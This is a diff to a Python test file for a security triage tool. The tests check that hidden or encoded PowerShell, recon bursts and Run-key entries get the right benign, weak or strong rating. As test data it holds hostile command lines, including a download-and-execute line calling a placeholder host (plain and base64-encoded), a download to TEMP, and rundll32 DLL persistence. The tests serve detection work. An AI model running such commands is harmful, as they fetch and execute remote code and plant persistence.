@@ -1,5 +1,7 @@
 """The checks and the verdict: benign activity stays Benign, attack activity is caught."""
 
+import base64
+
 from tests.fixtures.events import attack_events, benign_events, event
 from triage.checks import edit_distance, make_verdict, run_checks
 from triage import parse
@@ -200,19 +202,72 @@ def test_discord_run_key_is_known_good():
     assert "persistence" not in checks_fired(events)
 
 
-def test_hidden_powershell_alone_is_not_suspicious():
-    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    hidden = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{x}", Image=ps,
-                    CommandLine="powershell.exe -NoProfile -WindowStyle Hidden -File "
-                                "C:\\Program Files\\Agent\\inventory.ps1")]
-    assert run_checks(hidden) == []
-    bad_commands = ["powershell -enc " + "A" * 60,
-                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/a')",
-                    "powershell -c iex $code"]
-    for number, command in enumerate(bad_commands, start=2):
-        bad = [event(number, 1, "2026-01-05 09:00:00.000", ProcessGuid=f"{{y{number}}}", Image=ps,
-                     CommandLine=command)]
-        assert [f["strength"] for f in run_checks(bad)] == ["Strong"], command
+PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+
+def encoded(script):
+    """A PowerShell -EncodedCommand line for this script (base64 of UTF-16 text), as PowerShell writes it."""
+    return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
+
+
+def powershell_strengths(command):
+    """The strengths of the findings for one PowerShell command line."""
+    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", Image=PS, CommandLine=command)]
+    return [f["strength"] for f in run_checks(events)]
+
+
+def test_hidden_or_encoded_powershell_alone_is_not_suspicious():
+    assert powershell_strengths("powershell.exe -NoProfile -WindowStyle Hidden -File "
+                                "C:\\Program Files\\Agent\\inventory.ps1") == []
+    # A monitoring agent's encoded command that only reads a counter.
+    assert powershell_strengths(encoded("Get-Counter '\\Processor(_Total)\\% Processor Time'")) == []
+
+
+def test_powershell_download_and_run_is_strong():
+    download_and_run = "iex (New-Object Net.WebClient).DownloadString('http://x.example/a')"
+    assert powershell_strengths("powershell -c " + download_and_run) == ["Strong"]
+    assert powershell_strengths(encoded(download_and_run)) == ["Strong"]       # same, hidden by encoding
+    assert powershell_strengths(encoded("iex ([Text.Encoding]::UTF8.GetString("
+                                        "[Convert]::FromBase64String($b)))")) == ["Strong"]
+
+
+def test_powershell_download_only_is_weak():
+    assert powershell_strengths(encoded("iwr http://x.example/readme.txt -OutFile $env:TEMP\\r.txt")) == ["Weak"]
+    assert powershell_strengths("powershell -c iex $code") == ["Weak"]
+    finding = run_checks([event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", Image=PS,
+                                CommandLine=encoded("iwr http://x.example/a"))])[0]
+    assert finding["detail"] == "decoded command: iwr http://x.example/a"  # the analyst sees what it does
+
+
+def test_recon_typed_in_a_remote_admin_session_is_not_a_burst():
+    def recon(launcher):
+        return [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{l}", Image=launcher),
+                event(2, 1, "2026-01-05 09:00:01.000", ProcessGuid="{w}", ParentProcessGuid="{l}",
+                      Image="C:\\Windows\\System32\\whoami.exe", ParentImage=launcher),
+                event(3, 1, "2026-01-05 09:00:02.000", ProcessGuid="{n}", ParentProcessGuid="{l}",
+                      Image="C:\\Windows\\System32\\net.exe", ParentImage=launcher)]
+    assert "recon_burst" not in checks_fired(recon("C:\\Windows\\System32\\wsmprovhost.exe"))
+    assert [f["strength"] for f in run_checks(recon("C:\\Windows\\System32\\rundll32.exe"))
+            if f["check"] == "recon_burst"] == ["Strong"]
+
+
+def test_run_key_strength_depends_on_what_it_starts():
+    run_key = "HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Tool"
+    installer = "C:\\Users\\analyst\\Downloads\\setup.exe"
+
+    def run_key_findings(value):
+        events = [event(1, 13, "2026-01-05 09:00:00.000", Image=installer, TargetObject=run_key, Details=value)]
+        return [(f["strength"], f["title"]) for f in run_checks(events) if f["check"] == "persistence"]
+
+    assert run_key_findings('"C:\\Users\\analyst\\AppData\\Roaming\\Tool\\tray.exe" /tray') == \
+        [("Weak", "Starts itself at logon (Run key)")]
+    assert run_key_findings("rundll32.exe C:\\Users\\analyst\\AppData\\Roaming\\Tool\\x.dll,Start") == \
+        [("Strong", "Starts a DLL at logon (Run key)")]
+
+
+def test_only_low_findings_never_make_malicious():
+    weak = [{"strength": "Weak", "title": f"signal {n}"} for n in range(6)]
+    assert make_verdict(weak)["label"] == "Suspicious"
 
 
 def test_ransom_words_in_a_program_file_are_not_a_note():
